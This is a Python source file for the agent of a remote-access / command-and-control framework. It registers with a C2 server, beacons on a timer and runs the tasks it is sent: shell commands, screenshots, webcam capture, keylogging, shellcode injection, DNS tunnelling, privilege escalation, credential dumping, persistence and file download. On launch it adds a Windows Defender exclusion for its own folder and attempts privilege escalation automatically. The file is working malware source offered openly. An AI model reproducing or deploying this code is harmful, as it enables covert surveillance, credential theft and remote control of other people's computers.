import uuid
import time
import platform
import json
import base64
import logging
import requests
import threading
import importlib
from datetime import datetime
import traceback
import subprocess
import os

# Import all required module functions
from modules.system_info import get_system_info
from modules.process import list_processes
from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger, is_keylogger_running
from modules.shell import execute_command
from modules.files import list_directory, read_file
from modules.shellcode import inject_shellcode
from modules.dns_tunnel import start_dns_tunnel
from modules.privesc import attempt_privilege_escalation
from modules.credential_dump import dump_credentials
from modules.persistence import install_persistence

# Import new vulnerability scanning modules
try:
    from modules.network_scanner import NetworkScanner, scan_network, port_scan, vulnerability_scan
except ImportError:
    logging.warning("Network scanner module not available")
    scan_network = port_scan = vulnerability_scan = None

try:
    from modules.system_scanner import SystemScanner, scan_system, check_os_vulnerabilities
except ImportError:
    logging.warning("System scanner module not available")
    scan_system = check_os_vulnerabilities = None

# === Configuration ===
C2_URL = "http://192.168.200.105:5000"  # Update this to your C2 server's IP address
BEACON_INTERVAL = 10
agent_id = f"agent_{uuid.uuid4()}"
# ======================

# Logger setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def check_module_dependencies():
    """Check if all required modules are available and working"""
    module_status = {}
    try:
        # Test system_info module
        system_info = get_system_info()
        module_status['system_info'] = True
    except Exception as e:
        logging.error(f"System info module error: {str(e)}")
        module_status['system_info'] = False

    # Test other modules
    modules_to_test = {
        'process': list_processes,
        'surveillance': take_screenshot,
        'shell': execute_command,
        'files': list_directory
    }

    for module_name, test_func in modules_to_test.items():
        try:
            test_func()
            module_status[module_name] = True
        except Exception as e:
            logging.error(f"{module_name} module error: {str(e)}")
            module_status[module_name] = False

    # Test new vulnerability scanning modules
    if scan_network:
        try:
            # Test network scanner with localhost
            test_result = scan_network('127.0.0.1', [80, 443])
            module_status['network_scanner'] = True
        except Exception as e:
            logging.error(f"Network scanner module error: {str(e)}")
            module_status['network_scanner'] = False
    else:
        module_status['network_scanner'] = False

    if scan_system:
        try:
            # Test system scanner
            test_result = scan_system()
            module_status['system_scanner'] = True
        except Exception as e:
            logging.error(f"System scanner module error: {str(e)}")
            module_status['system_scanner'] = False
    else:
        module_status['system_scanner'] = False

    return module_status

def register():
    system_info = get_system_info()
    module_status = check_module_dependencies()
    payload = {
        "agent_id": agent_id,
        "system_info": system_info,
        "module_status": module_status,
        "status": "active"
    }
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    try:
        r = requests.post(f"{C2_URL}/api/agents/register", json={"data": encoded}, timeout=10)
        if r.ok:
            logging.info("Registered with C2")
        else:
            logging.warning(f"Registration failed: {r.text}")
    except requests.exceptions.ConnectionError:
        logging.error(f"Could not connect to C2 server at {C2_URL}. Please check if the server is running and accessible.")
    except Exception as e:
        logging.error(f"Registration error: {str(e)}")

def send_beacon():
    while True:
        # Get current system info for beacon
        try:
            system_info = get_system_info()
        except:
            system_info = {}
            
        payload = {
            "agent_id": agent_id,
            "status": "online",
            "system_info": system_info,
            "timestamp": datetime.now().isoformat()
        }
        encoded = base64.b64encode(json.dumps(payload).encode()).decode()
        try:
            r = requests.post(f"{C2_URL}/api/agents/beacon", json={"data": encoded})
            if r.status_code != 200:
                logging.error("Beacon failed: " + r.text)
        except Exception as e:
            logging.error("Beacon error: " + str(e))
        time.sleep(BEACON_INTERVAL)

def fetch_tasks():
    while True:
        try:
            r = requests.get(f"{C2_URL}/api/tasks/{agent_id}")
            if r.ok:
                resp = r.json()
                if 'data' in resp:
                    # Decode base64-encoded task JSON
                    task_json = base64.b64decode(resp['data']).decode()
                    task = json.loads(task_json)
                    if task.get("status") == "pending":
                        run_task(task)
            else:
                logging.error("Error getting tasks: " + r.text)
        except Exception as e:
            logging.error("Task fetch error: " + str(e))
        time.sleep(BEACON_INTERVAL)

def send_result(task_id, result):
    payload = {
        "agent_id": agent_id,
        "task_id": task_id,
        "result": result,
        "timestamp": datetime.now().isoformat()
    }
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    try:
        r = requests.post(f"{C2_URL}/api/results", json={"data": encoded})
        if not r.ok:
            logging.error("Result send failed: " + r.text)
    except Exception as e:
        logging.error("Result send error: " + str(e))

def send_agent_log(log_message):
    payload = {
        "task_id": "agent_log_" + datetime.now().strftime("%Y%m%d_%H%M%S"),
        "agent_id": agent_id,
        "data": {
            "status": "agent_log",
            "log": log_message,
            "timestamp": datetime.now().isoformat()
        }
    }
    try:
        r = requests.post(f"{C2_URL}/api/results", json=payload)
    except Exception as e:
        pass  # If this fails, just log locally

def send_vulnerability_data(vuln_data):
    """Send vulnerability data to the server for dashboard processing"""
    try:
        logging.info(f"Sending vulnerability data to server: {len(vuln_data.get('vulnerabilities', []))} vulnerabilities found")
        payload = {
            "agent_id": agent_id,
            "vulnerabilities": vuln_data.get('vulnerabilities', []),
            "scan_type": "privilege_escalation",
            "timestamp": datetime.now().isoformat(),
            "platform": vuln_data.get('platform'),
            "status": "active"
        }
        encoded = base64.b64encode(json.dumps(payload).encode()).decode()
        r = requests.post(f"{C2_URL}/api/agents/register", json={"data": encoded}, timeout=10)
        if r.ok:
            logging.info("Vulnerability data sent to server successfully")
        else:
            logging.warning(f"Failed to send vulnerability data: {r.text}")
    except Exception as e:
        logging.error(f"Error sending vulnerability data: {str(e)}")

def run_task(task):
    """Execute a task and send back the result"""
    task_id = task.get('task_id')
    task_type = task.get('type')
    task_data = task.get('data', {})
    result = None

    try:
        logging.info(f"Executing task {task_id} of type {task_type}")
        # Map task types to functions (support both dot and underscore naming)
        task_handlers = {
            'system.get_info': get_system_info,
            'system_get_info': get_system_info,
            'process.list': list_processes,
            'process_list': list_processes,
            'surveillance.screenshot': take_screenshot,
            'surveillance_screenshot': take_screenshot,
            'surveillance.webcam': capture_webcam,
            'surveillance_webcam': capture_webcam,
            'surveillance.keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
            'surveillance_keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
            'shell.execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
            'shell_execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
            'files.browser': lambda: list_directory(task_data.get('path', '.')),
            'files_browser': lambda: list_directory(task_data.get('path', '.')),
            'shellcode.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
            'shellcode_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
            'dns_tunnel.start': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
            'dns_tunnel_start': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
            'privesc.auto': attempt_privilege_escalation,
            'privesc_auto': attempt_privilege_escalation,
            'credentials.dump': lambda: dump_credentials(task_id),
            'credentials_dump': lambda: dump_credentials(task_id),
            'persistence.install': lambda: install_persistence(task_data.get('method', 'registry')),
            'persistence_install': lambda: install_persistence(task_data.get('method', 'registry')),
            'files.download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
            'files_download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
            
            # New vulnerability scanning tasks
            'network.scan': lambda: scan_network(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network else {'status': 'error', 'error': 'Network scanner not available'},
            'network_scan': lambda: scan_network(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if scan_network else {'status': 'error', 'error': 'Network scanner not available'},
            'network.port_scan': lambda: port_scan(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if port_scan else {'status': 'error', 'error': 'Network scanner not available'},
            'network_port_scan': lambda: port_scan(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if port_scan else {'status': 'error', 'error': 'Network scanner not available'},
            'network.vulnerability_scan': lambda: vulnerability_scan(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if vulnerability_scan else {'status': 'error', 'error': 'Network scanner not available'},
            'network_vulnerability_scan': lambda: vulnerability_scan(task_data.get('target', '127.0.0.1'), task_data.get('ports')) if vulnerability_scan else {'status': 'error', 'error': 'Network scanner not available'},
            
            'system.scan': lambda: scan_system() if scan_system else {'status': 'error', 'error': 'System scanner not available'},
            'system_scan': lambda: scan_system() if scan_system else {'status': 'error', 'error': 'System scanner not available'},
            'system.os_vulnerabilities': lambda: check_os_vulnerabilities() if check_os_vulnerabilities else {'status': 'error', 'error': 'System scanner not available'},
            'system_os_vulnerabilities': lambda: check_os_vulnerabilities() if check_os_vulnerabilities else {'status': 'error', 'error': 'System scanner not available'},
            
            'vulnerability.comprehensive_scan': lambda: comprehensive_vulnerability_scan(task_data),
            'vulnerability_comprehensive_scan': lambda: comprehensive_vulnerability_scan(task_data),
        }
        # Execute the task
        if task_type in task_handlers:
            result = task_handlers[task_type]()
        else:
            result = f"Unknown task type: {task_type}"
        # Flatten file/image results for download
        file_types = [
            'files.download', 'files_download',
            'surveillance.screenshot', 'surveillance_screenshot',
            'surveillance.webcam', 'surveillance_webcam'
        ]
        if task_type in file_types and isinstance(result, dict) and 'data' in result:
            send_result(task_id, {
                'status': result.get('status', 'success'),
                'data': result['data'],
                'format': result.get('format'),
                'path': result.get('path'),
                'filename': os.path.basename(result.get('path', '')) if result.get('path') else None,
                'timestamp': result.get('timestamp', datetime.now().isoformat()),
                'type': task_type
            })
        else:
            send_result(task_id, {
                'status': 'success',
                'data': result,
                'timestamp': datetime.now().isoformat(),
                'type': task_type
            })
    except Exception as e:
        error_msg = f"Task execution failed: {str(e)}"
        tb = traceback.format_exc()
        logging.error(error_msg)
        send_result(task_id, {
            'status': 'error',
            'error': error_msg,
            'timestamp': datetime.now().isoformat(),
            'type': task_type
        })
        send_agent_log(tb)

def comprehensive_vulnerability_scan(task_data):
    """Perform comprehensive vulnerability scanning"""
    try:
        logging.info("Starting comprehensive vulnerability scan")
        
        scan_results = {
            'scan_type': 'comprehensive_vulnerability_scan',
            'timestamp': datetime.now().isoformat(),
            'agent_id': agent_id,
            'results': {}
        }
        
        # System vulnerability scan
        if scan_system:
            try:
                logging.info("Performing system vulnerability scan")
                system_results = scan_system()
                scan_results['results']['system_scan'] = system_results
            except Exception as e:
                logging.error(f"System scan failed: {str(e)}")
                scan_results['results']['system_scan'] = {'status': 'error', 'error': str(e)}
        else:
            scan_results['results']['system_scan'] = {'status': 'error', 'error': 'System scanner not available'}
        
        # Network vulnerability scan
        if scan_network:
            try:
                logging.info("Performing network vulnerability scan")
                target = task_data.get('target', '127.0.0.1')
                ports = task_data.get('ports', [80, 443, 22, 21, 3306, 3389])
                network_results = scan_network(target, ports)
                scan_results['results']['network_scan'] = network_results
            except Exception as e:
                logging.error(f"Network scan failed: {str(e)}")
                scan_results['results']['network_scan'] = {'status': 'error', 'error': str(e)}
        else:
            scan_results['results']['network_scan'] = {'status': 'error', 'error': 'Network scanner not available'}
        
        # Privilege escalation check
        try:
            logging.info("Performing privilege escalation check")
            privesc_results = attempt_privilege_escalation()
            scan_results['results']['privilege_escalation'] = privesc_results
        except Exception as e:
            logging.error(f"Privilege escalation check failed: {str(e)}")
            scan_results['results']['privilege_escalation'] = {'status': 'error', 'error': str(e)}
        
        # System information
        try:
            logging.info("Gathering system information")
            system_info = get_system_info()
            scan_results['results']['system_info'] = system_info
        except Exception as e:
            logging.error(f"System info gathering failed: {str(e)}")
            scan_results['results']['system_info'] = {'status': 'error', 'error': str(e)}
        
        # Compile vulnerability summary
        vulnerabilities = []
        
        # Extract vulnerabilities from system scan
        if 'system_scan' in scan_results['results'] and scan_results['results']['system_scan'].get('status') == 'success':
            system_vulns = scan_results['results']['system_scan'].get('os_vulnerabilities', {}).get('vulnerabilities', [])
            vulnerabilities.extend(system_vulns)
        
        # Extract vulnerabilities from network scan
        if 'network_scan' in scan_results['results'] and scan_results['results']['network_scan'].get('status') == 'success':
            network_vulns = scan_results['results']['network_scan'].get('vulnerability_scan', {}).get('vulnerabilities', [])
            vulnerabilities.extend(network_vulns)
        
        # Extract vulnerabilities from privilege escalation
        if 'privilege_escalation' in scan_results['results'] and scan_results['results']['privilege_escalation'].get('status') == 'success':
            privesc_vulns = scan_results['results']['privilege_escalation'].get('vulnerabilities', [])
            vulnerabilities.extend(privesc_vulns)
        
        scan_results['vulnerabilities'] = vulnerabilities
        scan_results['total_vulnerabilities'] = len(vulnerabilities)
        
        # Calculate risk score
        risk_score = calculate_risk_score(vulnerabilities)
        scan_results['risk_score'] = risk_score
        
        logging.info(f"Comprehensive vulnerability scan completed. Found {len(vulnerabilities)} vulnerabilities. Risk score: {risk_score}")
        
        return scan_results
        
    except Exception as e:
        logging.error(f"Comprehensive vulnerability scan failed: {str(e)}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat(),
            'scan_type': 'comprehensive_vulnerability_scan'
        }

def calculate_risk_score(vulnerabilities):
    """Calculate risk score based on vulnerabilities"""
    if not vulnerabilities:
        return 0
    
    severity_scores = {
        'Critical': 10,
        'High': 7,
        'Medium': 4,
        'Low': 1,
        'Info': 0
    }
    
    total_score = 0
    for vuln in vulnerabilities:
        severity = vuln.get('severity', 'Low')
        total_score += severity_scores.get(severity, 1)
    
    # Normalize to 0-100 scale
    max_possible_score = len(vulnerabilities) * 10
    if max_possible_score > 0:
        risk_score = (total_score / max_possible_score) * 100
    else:
        risk_score = 0
    
    return round(risk_score, 2)

def auto_task_post_startup():
    logging.info("Running startup modules...")
    results = {
        "system_info": get_system_info()
    }
    for key, value in results.items():
        task_id = f"{key}_{datetime.now().strftime('%H%M%S')}"
        send_result(task_id, value)

def try_auto_priv_esc():
    result = attempt_privilege_escalation()
    if result.get('status') == 'success':
        logging.info('Privilege escalation succeeded.')
        # Send vulnerability data to server
        if 'data' in result and 'vulnerabilities' in result['data']:
            send_vulnerability_data(result['data'])
    else:
        logging.warning('Privilege escalation failed or not needed.')
    
    # Always send vulnerability data to server, even if no vulnerabilities found
    if 'data' in result:
        send_vulnerability_data(result['data'])

def add_defender_exclusion():
    agent_dir = os.path.dirname(os.path.abspath(__file__))
    try:
        subprocess.run([
            "powershell",
            "-Command",
            f"Add-MpPreference -ExclusionPath '{agent_dir}'"
        ], check=True)
        logging.info(f"Added Defender exclusion for: {agent_dir}")
    except Exception as e:
        logging.warning(f"Failed to add Defender exclusion: {e}")

if __name__ == "__main__":
    add_defender_exclusion()
    register()
    try_auto_priv_esc()
    auto_task_post_startup()
    threading.Thread(target=send_beacon, daemon=True).start()
    threading.Thread(target=fetch_tasks, daemon=True).start()
    while True:
        time.sleep(60)
